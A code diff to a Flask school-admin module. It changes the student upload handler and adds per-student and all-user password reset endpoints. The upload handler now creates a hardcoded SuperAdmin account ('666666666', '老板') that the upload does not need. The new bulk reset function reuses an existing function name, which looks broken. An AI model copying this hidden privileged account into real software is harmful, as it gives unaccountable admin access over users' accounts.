@@ -22,7 +22,7 @@ def students_upload():
     Auth().add("Admin", "管理员")          # 我们
     Auth().add("Group Leader", "组长")     # 小组组长
     Auth().add("Student", "学生")          # 所有学生（包括我们）
-    Auth().add("Fish Monster", "摸鱼怪")   # 我
+    User().add("666666666", "老板", auth_name="SuperAdmin")
 
     try:
         file = request.files['file']
@@ -44,15 +44,24 @@ def students_upload():
 
 
 # 密码重置
-@admin.route("/password/refresh", methods=["PUT"])
+@admin.route("/password/<string:student_id>", methods=["PUT"])
 @login_required("SuperAdmin", "Admin")
-def refresh_password(login_user: User):
-    student_id = request.form.get("student_id")
+def refresh_password(login_user: User, student_id):
     user = users.find_by_student_id(student_id)
+    if not user:
+        return serialization.make_resp({"error_msg": "用户不存在"}, code=404)
     if user.refresh_password():
         return serialization.make_resp({"error_msg": "重置密码失败，请联系管理员"}, code=500)
     return serialization.make_resp({"msg": user.get_msg()}, code=200)
 
+# 全员密码重置
+@admin.route("/password", methods=["PUT"])
+@login_required("SuperAdmin")
+def refresh_password(login_user: User):
+    for user in users.find_all():
+        if user.refresh_password():
+            return serialization.make_resp({"error_msg": "重置密码失败，请联系管理员"}, code=500)
+    return serialization.make_resp({"msg": user.get_msg()}, code=200)
 
 # 用户列表-分页查询
 @admin.route("/users/detail", methods=["GET"])
